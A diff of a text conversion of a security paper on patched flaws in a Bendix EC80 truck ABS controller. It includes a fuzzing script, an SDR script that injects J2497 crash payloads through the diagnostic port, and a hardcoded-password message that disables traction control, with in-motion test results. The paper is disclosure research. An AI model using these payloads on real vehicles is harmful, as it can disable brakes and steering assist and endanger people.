@@ -14,9 +14,9 @@ has_ocr: false
 redacted_secrets: 0
 ocr_confidence: null
 ocr_unreliable_blocks: 0
-vision_unreviewed_pages: 145
-vision_verified_pages_changed: 34
-vision_verified_pages: 34
+vision_unreviewed_pages: 102
+vision_verified_pages_changed: 77
+vision_verified_pages: 77
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 0
 companion_files: []
@@ -1541,150 +1541,259 @@ Returning to the vulnerabilities in the other deleted code, the PID 0xED handler
 
 Figure 15: Sigrok PulseView capture of the EC80 target using the sr-j1708 decoder connected to an external SSC P485 converter and the can2 decoder connected to the EC80 target’s CAN bus. CAN frame payload C00C005#C00C00DA7A9A10AD is shown being transmitted after payload reception.
 
-Trailer VIN PID, not the previously allocated PID: Entry Assist Control #1) can also crash the ECU. Sending a rapid sequence of messages with a large length parameter triggered this vulnerability. Bench and closed-track testing con�rmed that greater than 10 repeated 89EDFE messages triggered the crash (128x was used to be sure). The PID 0xED handler (sub_F2BA46) causes this by copying the PID payload (length-speci�ed) into a static buffer at 0x5BDC without bounds checking. This unbounded copy targets a static buffer at 0x5BDC with a 26-byte safe limit. Overflow overwrites pointers at 0x5BF6 and 0x5BF8. These pointers are dereferenced by sub_F38241 during conditional memcpy operations controlled by the PID 0xB4 handler. Like the 0xC2 handler, the attacker controls copy size and can control the adjacent bytes in the receive FIFO buffer.
+Trailer VIN PID, not the previously allocated PID: Entry Assist Control #1) can also crash the ECU. Sending a rapid sequence of messages with a large length parameter triggered this vulnerability. Bench and closed-track testing confirmed that greater than 10 repeated 89EDFE messages triggered the crash (128x was used to be sure). The PID 0xED handler (sub_F2BA46) causes this by copying the PID payload (length-specified) into a static buffer at 0x5BDC without bounds checking. This unbounded copy targets a static buffer at 0x5BDC with a 26-byte safe limit. Overflow overwrites pointers at 0x5BF6 and 0x5BF8. These pointers are dereferenced by sub_F38241 during conditional memcpy operations controlled by the PID 0xB4 handler. Like the 0xC2 handler, the attacker controls copy size and can control the adjacent bytes in the receive FIFO buffer.
 
-Theoretically, sequential 0xED and 0xB4 PID payloads (potentially in one J2497 message) could establish a write primitive. The write primitive pointer and data are 26 and 28 bytes from the 0xED handler’s buffer start. Successful exploitation requires careful J2497 receive buffer grooming to overcome the 18-byte control limit. This write primitive makes RCE feasible, given unused RAM regions and �xed-address function pointers in the �rmware. It would also be possible to send CAN data with a write primitive and without RCE.
+Theoretically, sequential 0xED and 0xB4 PID payloads (potentially in one J2497 message) could establish a write primitive. The write primitive pointer and data are 26 and 28 bytes from the 0xED handler’s buffer start. Successful exploitation requires careful J2497 receive buffer grooming to overcome the 18-byte control limit. This write primitive makes RCE feasible, given unused RAM regions and fixed-address function pointers in the firmware. It would also be possible to send CAN data with a write primitive and without RCE.
 
 Deleted SCI2 EDGE interrupt code theoretically presented a write-where primitive. Exploitation involves: 1) Triggering an EDGE interrupt and timeout to partially reset the receive buffer (by sub_F1B035), setting a buffer full flag (see below) but leaving the write offset (0x3C4B) un-reset. 2) Consuming a subsequent message clears the buffer full flag without resetting the offset, potentially exceeding the 0x54 buffer limit. 3) sub_EC803E (append data) contained a write-before-check flaw. Data was written to the receive buffer (0x3BF5) at the current offset (0x3C4B) before boundary validation. This allowed writes beyond the limit. 4) Positioning the write offset at +0x54 and sending a 4-byte frame allowed setting arbitrary upper bound
-
-35
 
 ## Slide 36
 
 (0x3C49) and current offset (0x3C4B) values. Subsequent data would be written to the new offset address.
 
-The PID 0xC7 handler contained a hardcoded password check. Receiving the matching password disables traction control, as per J1587 speci�cation. Bench testing con�rmed that message ACC703004B42 satis�es this password check. 4B42 is ASCII ‘KB’, presumably for KnorrBremse, Bendix’s parent company (since 2024 after a joint venture starting in 1993).
+The PID 0xC7 handler contained a hardcoded password check. Receiving the matching password disables traction control, as per J1587 specification. Bench testing confirmed that message ACC703004B42 satisfies this password check. 4B42 is ASCII ‘KB’, presumably for Knorr-Bremse, Bendix’s parent company (since 2024 after a joint venture starting in 1993).
 
 The table below provides a summary of vulnerabilities in removed functionality.
 
 |**Component**|**Vulnerability**|**Impact**|
 |---|---|---|
-|PID 0xC2|Buffer Overflow|DoS (Veri�ed), RCE (Veri�ed)|
-|PID 0xED|Unbounded Copy|DoS (Veri�ed), RCE (Theoretical)|
-|PID 0xC7|Hardcoded Credential|Auth Bypass (Veri�ed)|
+|PID 0xC2|Buffer Overflow|DoS (Verified), RCE (Verified)|
+|PID 0xED|Unbounded Copy|DoS (Verified), RCE (Theoretical)|
+|PID 0xC7|Hardcoded Credential|Auth Bypass (Verified)|
 |SCI2 EDGE|OOB Write|DoS (Theoretical), RCE (Theoretical)|
 
-Exploits of these RCE vulnerabilities (veri�ed and theoretical) will depend on the speci�c ‘Z’ �rmware version memory layout. The ID9363 updater contains 13 ‘Z’ versions (covering a total ~450,000 units); however, exploits of the DoS vulnerabilities and hardcoded credential will not. Testing shows they worked in all three tested ‘Z’ versions and likely affect all versions.
+Exploits of these RCE vulnerabilities (verified and theoretical) will depend on the specific ‘Z’ firmware version memory layout. The ID9363 updater contains 13 ‘Z’ versions (covering a total ~450,000 units); however, exploits of the DoS vulnerabilities and hardcoded credential will not. Testing shows they worked in all three tested ‘Z’ versions and likely affect all versions.
 
-Reverse engineering is not required to discover all these vulnerabilities. A simple fuzzing script discovered the PID 0xC2 and 0xED crashes. These were veri�ed on the bench and in-motion.
+Reverse engineering is not required to discover all these vulnerabilities. A simple fuzzing script discovered the PID 0xC2 and 0xED crashes. These were verified on the bench and in-motion.
 
-import time import sys import threading import ctypes import types import hid from scapy.all import ***** from hv_networks.J1587Driver import J1708DriverFactory, get_j1708_driver_factory
+```python
+import time
+import sys
+import threading
+import ctypes
+import types
+import hid
+from scapy.all import *
+from hv_networks.J1587Driver import J1708DriverFactory, get_j1708_driver_factory
 
-load_layer("can") conf.contribs['CANSocket'] **=** {'use-python-can': True} load_contrib('cansocket') **def** relay_control(on): **try** : d **=** hid.device() **;** d.open(0x16c0, 0x05df) d.send_feature_report(bytes([0x00, 0xFE **if** on **else** 0xFC] **+** [0] ***** 6)) d.close() **except** : **pass def** csock_factory(): s **=** CANSocket(interface **=** 'cantact', channel **=** '0', bitrate **=** 500_000) orig_close **=** s.close **def** close(self): orig_close() **;** self.closed **=** True **;** getattr(self, 'can_iface', None) **and** ↪ setattr(self.can_iface, '_is_shutdown', True) s.close **=** types.MethodType(close, s) **return** s
+load_layer("can")
+conf.contribs['CANSocket'] = {'use-python-can': True}
+load_contrib('cansocket')
 
-36
+def relay_control(on):
+    try:
+        d = hid.device(); d.open(0x16c0, 0x05df)
+        d.send_feature_report(bytes([0x00, 0xFE if on else 0xFC] + [0]*6))
+        d.close()
+    except: pass
+
+def csock_factory():
+    s = CANSocket(interface='cantact', channel='0', bitrate=500_000)
+    orig_close = s.close
+    def close(self): orig_close(); self.closed = True; getattr(self, 'can_iface', None) and
+    ↪  setattr(self.can_iface, '_is_shutdown', True)
+    s.close = types.MethodType(close, s)
+    return s
+```
 
 ## Slide 37
 
-**def** can_counter(csock, packet_counter, lock): **try** : csock.sniff(prn **=lambda** p: (print('*E*', end **=** '') **if** p[CAN].identifier **==** 0x00C **else** ↪ (lock.acquire(), packet_counter.value. **__iadd__** (1), lock.release())[2]), store **=** 0) **except** : **pass if** __name__ **==** "__main__": j1708_driver **=** get_j1708_driver_factory().make() msg **=** bytearray(b'\x89\xfe\x88\xde\xfe\xa7') **with** csock_factory() as csock: packet_count, count_lock **=** ctypes.c_uint64(0), threading.Lock() threading.Thread(target **=** can_counter, args **=** (csock, packet_count, count_lock), ↪ daemon **=** True).start() time.sleep(1) **;** relay_control(True) **;** time.sleep(2.0) **for** i **in** range(4, 256): **for** j **in** range(256): **for** k **in** range(256): msg[0:3] **=** [i, j, k] **with** count_lock: last_count **=** packet_count.value **for** _ **in** range(2): **while** time.monotonic_ns() **<=** j1708_driver.next_send_ns **+** 11_000: **pass** j1708_driver.send_message(msg, has_checksum **=** False) start **=** time.monotonic_ns() **while** time.monotonic_ns() **-** start **<** 5e9: **with** count_lock: **if** packet_count.value **>** last_count: **break if** current_count **>** last_count: print("continuing") time.sleep(1.0) **else** : print("ECU traffic did not return") good **=** False time.sleep(2.0) _# let the prints flush_
+```python
+def can_counter(csock, packet_counter, lock):
+    try: csock.sniff(prn=lambda p: (print('*E*', end='') if p[CAN].identifier == 0x00C else
+↪  (lock.acquire(), packet_counter.value.__iadd__(1), lock.release())[2]), store=0)
+    except: pass
+
+if __name__ == "__main__":
+    j1708_driver = get_j1708_driver_factory().make()
+    msg = bytearray(b'\x89\xfe\x88\xde\xfe\xa7')
+
+    with csock_factory() as csock:
+        packet_count, count_lock = ctypes.c_uint64(0), threading.Lock()
+        threading.Thread(target=can_counter, args=(csock, packet_count, count_lock),
+↪  daemon=True).start()
+        time.sleep(1); relay_control(True); time.sleep(2.0)
+
+        for i in range(4, 256):
+            for j in range(256):
+                for k in range(256):
+                    msg[0:3] = [i, j, k]
+                    with count_lock: last_count = packet_count.value
+
+                    for _ in range(2):
+                        while time.monotonic_ns() <= j1708_driver.next_send_ns + 11_000: pass
+                        j1708_driver.send_message(msg, has_checksum=False)
+
+                    start = time.monotonic_ns()
+                    while time.monotonic_ns() - start < 5e9:
+                        with count_lock:
+                            if packet_count.value > last_count: break
+
+                    if current_count > last_count:
+                        print("continuing")
+                        time.sleep(1.0)
+                    else:
+                        print("ECU traffic did not return")
+                        good=False
+
+time.sleep(2.0)  # let the prints flush
+```
 
 ### **Notes on In-Motion Vehicle Tests**
 
-Onsite testing used a host-provided tractor that did not perfectly match the source vehicle of the vulnerable �rmware but whose EC80 part number matched perfectly – because the host did not have any EC80s that were not already updated by ID9363. We manually flashed the target ECU with the vulnerable �rmware via BDM. Then the target ECU was part-calibrated to the tractor using OEM tools, and baseline ABS functionality was con�rmed via hard braking before further testing.
+Onsite testing used a host-provided tractor that did not perfectly match the source vehicle of the vulnerable firmware but whose EC80 part number matched perfectly – because the host did not have any EC80s that were not already updated by ID9363. We manually flashed the target ECU with the vulnerable firmware via BDM. Then the target ECU was part-calibrated to the tractor using OEM tools, and baseline ABS functionality was confirmed via hard braking before further testing.
 
-Testing focused on the crashes in the handlers for J1587 PIDs 0xC2 and 0xED, identi�ed during bench testing. We injected J2497 signals using an FL2K Software De�ned Radio (SDR) transmitter and power ampli�er.
+Testing focused on the crashes in the handlers for J1587 PIDs 0xC2 and 0xED, identified during bench testing. We injected J2497 signals using an FL2K Software Defined Radio (SDR) transmitter and power amplifier.
 
 It emits the test signal on an attached FL2K SDR. It expects the j2497-keyhole project is installed as a package or that the script runs from the same directory as the project.
 
-37
-
 ## Slide 38
 
-Figure 16: Right: a 10uF DC block resulting in AC-coupling of the FL2K SDR (not pictured) connected to a power ampli�er (not pictured). Left: Connection of the same to the in-cab on board diagnostic (OBD) port.
+Figure 16: Right: a 10uF DC block resulting in AC-coupling of the FL2K SDR (not pictured) connected to a power amplifier (not pictured). Left: Connection of the same to the in-cab on board diagnostic (OBD) port.
 
 Figure 17: Top Left: failure state of instrument cluster after any and all the ECU crashes described in Section 8 while still in-motion. Wide: in-cab picture of in-motion vehicle test with black bar redacting.
 
-38
-
 ## Slide 39
 
-_# MIT License # # Copyright (c) 2022-2026 National Motor Freight Traffic Association Inc. # # Permission is hereby granted, free of charge, to any person obtaining a copy # of this software and associated documentation files (the "Software"), to deal # in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and/or sell # copies of the Software, and to permit persons to whom the Software is # furnished to do so, subject to the following conditions: # # The above copyright notice and this permission notice shall be included in all # copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR # IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, # FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE # AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE # SOFTWARE._
+```python
+# MIT License
+#
+# Copyright (c) 2022-2026 National Motor Freight Traffic Association Inc.
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
 
-import binascii import itertools import sys import numpy as np import subprocess import errno
+import binascii
+import itertools
+import sys
+import numpy as np
+import subprocess
+import errno
 
-import j2497_keyhole from j2497_common import get_payload_bits, get_payload_chirps, generate_signal
+import j2497_keyhole
+from j2497_common import get_payload_bits, get_payload_chirps, generate_signal
 
-FL2K_FULL_SCALE **=** 127 FL2K_SAMP_RATE **=** 7777777 _# The lowest FL2K sample rate that it will support_
+FL2K_FULL_SCALE = 127
+FL2K_SAMP_RATE = 7777777  # The lowest FL2K sample rate that it will support
 
-_# Some zeros to 'warm-up' the fl2k transmitter before sending the J2497 waveform, otherwise # waveform is corrupted by fl2k transmit_ FL2K_WARMUP_SIZE **=** FL2K_SAMP_RATE ***** 4 _# Some zeros to cool-down the fl2k transmitter, otherwise the waveform is corrupted by fl2k_ ↪ _transmit_
+# Some zeros to 'warm-up' the fl2k transmitter before sending the J2497 waveform, otherwise
+# waveform is corrupted by fl2k transmit
+FL2K_WARMUP_SIZE = FL2K_SAMP_RATE * 4
+# Some zeros to cool-down the fl2k transmitter, otherwise the waveform is corrupted by fl2k
+↪   transmit
+FL2K_COOLDOWN_SIZE = FL2K_SAMP_RATE * 4
 
-FL2K_COOLDOWN_SIZE **=** FL2K_SAMP_RATE ***** 4
 
-**def** prep_signal(signal: np.ndarray): out **=** signal ***** FL2K_FULL_SCALE out **=** out.astype('int8').tobytes() **return** out
+def prep_signal(signal: np.ndarray):
+    out = signal * FL2K_FULL_SCALE
+    out = out.astype('int8').tobytes()
+    return out
 
-**def** get_chirps(hexstring, sample_rate):
 
-**return** get_payload_chirps(get_payload_bits(binascii.unhexlify(hexstring)), sample_rate)
+def get_chirps(hexstring, sample_rate):
+    return get_payload_chirps(get_payload_bits(binascii.unhexlify(hexstring)), sample_rate)
 
-LA_OFFSET_US **=** 1090 MIN_BLANK_US **=** 1250
 
-_# pick one of the baddies to use at a time_ baddies **=** [ ['00c2fe'],
+LA_OFFSET_US = 1090
+MIN_BLANK_US = 1250
 
-39
+# pick one of the baddies to use at a time
+baddies = [
+    ['00c2fe'],
+```
 
 ## Slide 40
 
-_#['89edfe',] * 128_ ] **def** baddies_spam(sample_rate, receiver_wait_us **=** 15_000): **for** baddies_set **in** baddies: **for** b **in** baddies_set: baddie_chirps **=** get_chirps(b, sample_rate) min_receive_wait **=** np.zeros(int(receiver_wait_us ***** sample_rate **/** 1E6), np.float32) chirps_set **=** np.concatenate([baddie_chirps, min_receive_wait]) **yield** chirps_set REPEAT **=** 100 RX_MIN_WAIT_US **=** 15_000 _# wait time to use as minimum between fast-as-possible messages sent_ FL2K_WRITE_CHUNK_SIZE **=** 4096 _# size of bytes to write at a time to the FL2K subprocess_ **if** __name__ **==** '__main__': p **=** subprocess.Popen(['fl2k_file', '-s', str(FL2K_SAMP_RATE), '-r', '1', '-'], ↪ stdin **=** subprocess.PIPE, stdout **=** subprocess.DEVNULL, stderr **=** subprocess.DEVNULL) p.stdin.write(FL2K_WARMUP) **try** : chirps_chain **=** itertools.chain(baddies_spam(FL2K_SAMP_RATE)) repeating **=** itertools.chain.from_iterable(itertools.repeat(tuple(chirps_chain), 100)) **for** chirps **in** repeating: data **=** prep_signal(chirps) **for** i **in** range(0, len(data), 4096): p.stdin.write(data[i:i **+** 4096]) **except** _IOError_ : **pass** p.stdin.write(FL2K_COOLDOWN) p.stdin.close() **;** p.kill() **;** p.wait()
+```python
+    #['89edfe',] * 128
+]
 
-Due to insuf�cient J2497 �ltering at the diagnostic port, we were able to use a simple in-cab setup: AC-coupled via a 10uF capacitor to the diagnostic port’s VBAT pin (Figure 16). This was con�rmed by observing Trailer ABS fault dash light status and 0xF001 PGN with python -m can.viewer -i cantact -c 0 -b 500000 --filter=00F00100:00FFFF00 (using python-can and CANtact). As shown in previous research, this simulates wireless injection.
+def baddies_spam(sample_rate, receiver_wait_us=15_000):
+    for baddies_set in baddies:
+        for b in baddies_set:
+            baddie_chirps = get_chirps(b, sample_rate)
+            min_receive_wait = np.zeros(int(receiver_wait_us * sample_rate / 1E6), np.float32)
+            chirps_set = np.concatenate([baddie_chirps, min_receive_wait])
 
-We conducted in-motion tests below 5 mph and at ~9 mph — fast enough to trigger ABS pulsing but safe for occupants. At 9 mph, after observing the ECU crash via CAN, the driver initiated a hard brake to check for ABS pulsing. In all cases, CAN traf�c ceased. ECU recovery always required a battery disconnect. This is a relevant condition because some tractors are con�gured without a battery disconnect switch, requiring a manual removal of the battery leads or a manual cycling of a fuse to recover the ECU. The crash consistently caused loss of speedometer, steering assist, and shifting (Figure 17). The results are summarized in the table below, which details the in-motion test results.
+            yield chirps_set
+
+REPEAT = 100
+RX_MIN_WAIT_US=15_000  # wait time to use as minimum between fast-as-possible messages sent
+FL2K_WRITE_CHUNK_SIZE = 4096  # size of bytes to write at a time to the FL2K subprocess
+if __name__ == '__main__':
+    p = subprocess.Popen(['fl2k_file', '-s', str(FL2K_SAMP_RATE), '-r', '1', '-'],
+↪  stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    p.stdin.write(FL2K_WARMUP)
+
+    try:
+        chirps_chain = itertools.chain(baddies_spam(FL2K_SAMP_RATE))
+        repeating = itertools.chain.from_iterable(itertools.repeat(tuple(chirps_chain), 100))
+        for chirps in repeating:
+            data = prep_signal(chirps)
+            for i in range(0, len(data), 4096): p.stdin.write(data[i:i+4096])
+    except IOError: pass
+
+    p.stdin.write(FL2K_COOLDOWN)
+    p.stdin.close(); p.kill(); p.wait()
+```
+
+Due to insufficient J2497 filtering at the diagnostic port, we were able to use a simple in-cab setup: AC-coupled via a 10uF capacitor to the diagnostic port’s VBAT pin (Figure 16). This was confirmed by observing Trailer ABS fault dash light status and 0xF001 PGN with python -m can.viewer -i cantact -c 0 -b 500000 --filter=00F00100:00FFFF00 (using python-can and CANtact). As shown in previous research, this simulates wireless injection.
+
+We conducted in-motion tests below 5 mph and at ~9 mph — fast enough to trigger ABS pulsing but safe for occupants. At 9 mph, after observing the ECU crash via CAN, the driver initiated a hard brake to check for ABS pulsing. In all cases, CAN traffic ceased. ECU recovery always required a battery disconnect. This is a relevant condition because some tractors are configured without a battery disconnect switch, requiring a manual removal of the battery leads or a manual cycling of a fuse to recover the ECU. The crash consistently caused loss of speedometer, steering assist, and shifting (Figure 17). The results are summarized in the table below, which details the in-motion test results.
 
 One difference emerged: in the PID 0xED case, the EC80 stopped streaming signal data but still responded to UDS TP requests. This was not observed in the PID 0xC2 case or during PID 0xED bench testing.
-
-40
 
 ## Slide 41
 
 |**Vuln.**|**Speed**|**UDS**|**Vehicle Symptoms**|**ABS Function**|
 |---|---|---|---|---|
-|0xED|<5|Yes|Loss of shift, steering assist, speedo.|Not Tested|
-|Dos|mph||Cluster faults.||
-|0xED|9 mph|Yes|Loss of shift, steering assist, speedo.|**Disabled**|
-|DoS||||(Lockup)|
-|0xC2|<5|No|Loss of speedo, steering assist.|Not Tested|
-|DoS|mph||||
-|0xC2|9 mph|No|Loss of shift, steering assist, speedo.|**Disabled**|
-|DoS||||(Lockup)|
+|0xED Dos|< 5 mph|Yes|Loss of shift, steering assist, speedo. Cluster faults.|Not Tested|
+|0xED DoS|9 mph|Yes|Loss of shift, steering assist, speedo.|**Disabled** (Lockup)|
+|0xC2 DoS|< 5 mph|No|Loss of speedo, steering assist.|Not Tested|
+|0xC2 DoS|9 mph|No|Loss of shift, steering assist, speedo.|**Disabled** (Lockup)|
 
-We repeated these in-motion tests on a second vehicle: owned by a fleet and from a different OEM than the previous one. During these tests we were able to test also the 0xC7 hardcoded credential impacts. In this vehicle – manufactured by a different OEM – the impact of crashing the ABS controller did not include loss of speedometer nor steering nor shifting; however, it did quite obviously impact ABS Function (the modulator ‘pulsing’). This was also true for the 0xC7 hardcoded credential which, in this case, put the truck into a persistent ‘Dyno Mode’ (reported on the instrument cluster) which required both the OEM diagnostic tool and Bendix diagnostic tool to remove this persistent mode. A �nal note is that this truck did not have a battery disconnect and so every test required a manual battery disconnect / re-connect cycle because each test resulted in an ECU crash.
+We repeated these in-motion tests on a second vehicle: owned by a fleet and from a different OEM than the previous one. During these tests we were able to test also the 0xC7 hardcoded credential impacts. In this vehicle – manufactured by a different OEM – the impact of crashing the ABS controller did not include loss of speedometer nor steering nor shifting; however, it did quite obviously impact ABS Function (the modulator ‘pulsing’). This was also true for the 0xC7 hardcoded credential which, in this case, put the truck into a persistent ‘Dyno Mode’ (reported on the instrument cluster) which required both the OEM diagnostic tool and Bendix diagnostic tool to remove this persistent mode. A final note is that this truck did not have a battery disconnect and so every test required a manual battery disconnect / re-connect cycle because each test resulted in an ECU crash.
 
 |**Vuln.**|**Speed**|**UDS**|**Vehicle Symptoms**|**ABS Function**|
 |---|---|---|---|---|
-|0xED
-Dos|<5
-mph|No|Mulitple Cluster faults.|Not Tested|
-|0xED|9 mph|No|Mulitple Cluster faults.|**Disabled**|
-|DoS||||(Lockup)|
-|0xC2|<5|No|Mulitple Cluster faults.|Not Tested|
-|DoS|mph||||
-|0xC2|9 mph|No|Mulitple Cluster faults.|**Disabled**|
-|DoS||||(Lockup)|
-|0xC7
-hard-
-coded|6 mph|No|Mulitple Cluster faults including “Dyno Mode”.
-Loss of shifting in Reverse|**Disabled**
-(Lockup)|
+|0xED Dos|< 5 mph|No|Mulitple Cluster faults.|Not Tested|
+|0xED DoS|9 mph|No|Mulitple Cluster faults.|**Disabled** (Lockup)|
+|0xC2 DoS|< 5 mph|No|Mulitple Cluster faults.|Not Tested|
+|0xC2 DoS|9 mph|No|Mulitple Cluster faults.|**Disabled** (Lockup)|
+|0xC7 hardcoded|6 mph|No|Mulitple Cluster faults including “Dyno Mode”. Loss of shifting in Reverse|**Disabled** (Lockup)|
 
 ### **Conclusions**
 
 This work demonstrates binary differential analysis on legacy automotive architectures, using heuristics and symbolic analysis to overcome tooling limitations. Our analysis reveals several vulnerabilities were patched by the ID9363 update.
 
-While the vendor emphasized safety compliance regarding random noise, our analysis con�rms a broader security impact. Random line noise is unlikely to generate the checksum-valid J1587
-
-41
+While the vendor emphasized safety compliance regarding random noise, our analysis confirms a broader security impact. Random line noise is unlikely to generate the checksum-valid J1587
 
 ## Slide 42
 
-frames required to trigger these vulnerabilities. Speci�cally, the patch removes the tractor ECU’s J1587 parsing stack (except LAMP/ABS event handling), eliminating vulnerable handlers for PIDs 0xC2, 0xED, and 0xC7.
+frames required to trigger these vulnerabilities. Specifically, the patch removes the tractor ECU’s J1587 parsing stack (except LAMP/ABS event handling), eliminating vulnerable handlers for PIDs 0xC2, 0xED, and 0xC7.
 
-We classify the removed functionality as critically flawed, containing unauthenticated memory corruption (PIDs 0xC2, 0xED) and hardcoded weak authentication (PID 0xC7). In-motion testing validated the severity: exploiting the PID 0xC2 buffer overflow caused immediate ABS Denial of Service (DoS), physically manifesting as loss of steering assist, speedometer, shifting and ABS pulsing. The PID 0xED handler induced the same DoS via memory corruption. Bench testing con�rmed RCE via the memory corruption in the PID 0xC2 handler.
+We classify the removed functionality as critically flawed, containing unauthenticated memory corruption (PIDs 0xC2, 0xED) and hardcoded weak authentication (PID 0xC7). In-motion testing validated the severity: exploiting the PID 0xC2 buffer overflow caused immediate ABS Denial of Service (DoS), physically manifesting as loss of steering assist, speedometer, shifting and ABS pulsing. The PID 0xED handler induced the same DoS via memory corruption. Bench testing confirmed RCE via the memory corruption in the PID 0xC2 handler.
 
-The ID9363 update mitigates risks from attackers with wireless adjacency or other forms of J2497 network access, improving the compliance to requirements NGW-S-001 through -005. Bendix’s proactive recall and �rmware update represent a commendable and responsible action. This is particularly important as users are believed to prioritize safety recalls over security patches. However, the lack of distinct CVE assignments for these flaws may obscure the patch’s security criticality. What is recommended – by ISO/IEC 29147 and CISA – is that vulnerabilities which are patched should be communicated to users so that they can make their own informed risk calculations.
+The ID9363 update mitigates risks from attackers with wireless adjacency or other forms of J2497 network access, improving the compliance to requirements NGW-S-001 through -005. Bendix’s proactive recall and firmware update represent a commendable and responsible action. This is particularly important as users are believed to prioritize safety recalls over security patches. However, the lack of distinct CVE assignments for these flaws may obscure the patch’s security criticality. What is recommended – by ISO/IEC 29147 and CISA – is that vulnerabilities which are patched should be communicated to users so that they can make their own informed risk calculations.
 
 The features removed align with the security architecture for tractor J2497 reception detailed in all of: (For tractor J2497 transmission the same sources recommended that the tractor mitigate attacks on older trailer equipment; this patch does not appear to add any such mitigations.)
 
-1. the ATA TMC position paper on next generation tractor trailer interfaces: “Pertaining to PLC communications as described in SAE J2497: only the MID 10 and 11 lamp messages, MID 125 J2497 identi�cation, and MID 87 active ABS event shall be permitted on new tractor and trailer equipment…”
+1. the ATA TMC position paper on next generation tractor trailer interfaces: “Pertaining to PLC communications as described in SAE J2497: only the MID 10 and 11 lamp messages, MID 125 J2497 identification, and MID 87 active ABS event shall be permitted on new tractor and trailer equipment…”
 
 2. the CISA mitigations in advisory ICSA-25-021-03: “To most effectively mitigate general vulnerabilities of the powerline communication, any [tractors] utilizing J2497 technology should disable all features where possible, except for backwards-compatibility with LAMP ON detection only.”
 
@@ -1694,11 +1803,9 @@ Given the potential for a) malicious J2497 signal injection and b) compromised J
 
 ## **Acknowledgments**
 
-We would like to thank our colleagues at the National Motor Freight Traf�c Association Inc. whose expertise and dedication have been invaluable to the completion of this research. Particularly Anne Zachos for the continuous assistance in analysis and onsite testing.
+We would like to thank our colleagues at the National Motor Freight Traffic Association Inc. whose expertise and dedication have been invaluable to the completion of this research. Particularly Anne Zachos for the continuous assistance in analysis and onsite testing.
 
 We would like to thank AIS for access to their Class 8 vehicle multiple times during this research. Thank you to Hannah Silva and Jesse Norton for sharing S12X development materials and EC80 experience. Thank you to Chris York for the trailhead. Thank you to Jonatan Mars for
-
-42
 
 ## Slide 43
 
@@ -1708,1906 +1815,2071 @@ We used various large language models (Gemini 2, 2.5-pro, 3-pro) for tasks such 
 
 ## **Ethical Considerations**
 
-This research prioritizes disclosure and minimizes potential harm. Prior to commencing the technical analysis, in early 2025, the manufacturer of the brake ECU was contacted and informed of our intent to conduct research on their �rmware update for the safety recall and requested to collaborate. Again, as the analysis neared completion, the manufacturer was contacted in an attempt to provide them with an overview of our �ndings. Two of the three OEMs have received the results in this paper. NHTSA has also been informed of this research and results.
+This research prioritizes disclosure and minimizes potential harm. Prior to commencing the technical analysis, in early 2025, the manufacturer of the brake ECU was contacted and informed of our intent to conduct research on their firmware update for the safety recall and requested to collaborate. Again, as the analysis neared completion, the manufacturer was contacted in an attempt to provide them with an overview of our findings. Two of the three OEMs have received the results in this paper. NHTSA has also been informed of this research and results.
 
-Crucially, this paper discusses only functions and vulnerabilities addressed by the manufacturer’s safety recall. Only deleted function code is shared. Limited side-by-side code modi�cations are shared to limit disclosure of code in the �eld. The PoC provided can be used to con�rm RCE but does not disclose the details of CAN bus or other physical control by the ECU. The updated �rmware has been deployed on ~310,000 units at the time of this writing. These vulnerabilities are con�rmed absent in updated �rmware versions Z300822, Z302578, Z302579 (one for each affected OEM). Thus, disclosing these vulnerabilities introduces no new risks. By focusing on already-patched issues, this research aims to contribute to the broader understanding of automotive security without inadvertently exposing users to unmitigated risks.
+Crucially, this paper discusses only functions and vulnerabilities addressed by the manufacturer’s safety recall. Only deleted function code is shared. Limited side-by-side code modifications are shared to limit disclosure of code in the field. The PoC provided can be used to confirm RCE but does not disclose the details of CAN bus or other physical control by the ECU. The updated firmware has been deployed on ~310,000 units at the time of this writing. These vulnerabilities are confirmed absent in updated firmware versions Z300822, Z302578, Z302579 (one for each affected OEM). Thus, disclosing these vulnerabilities introduces no new risks. By focusing on already-patched issues, this research aims to contribute to the broader understanding of automotive security without inadvertently exposing users to unmitigated risks.
 
-Finally, the in-vehicle testing was conducted in a controlled environment, utilizing a closed test track for in-motion vehicle testing. All testing was performed with the explicit cooperation and support of an OEM, ensuring that safety protocols were rigorously followed and that no public roads or operational vehicles were subjected to unveri�ed or potentially hazardous conditions.
+Finally, the in-vehicle testing was conducted in a controlled environment, utilizing a closed test track for in-motion vehicle testing. All testing was performed with the explicit cooperation and support of an OEM, ensuring that safety protocols were rigorously followed and that no public roads or operational vehicles were subjected to unverified or potentially hazardous conditions.
 
 ## **References**
 
-1. Aleph One. (1996). Smashing The Stack For Fun And Pro�t. _Phrack Magazine_ , 7(49). http: //phrack.org/issues/49/14.html
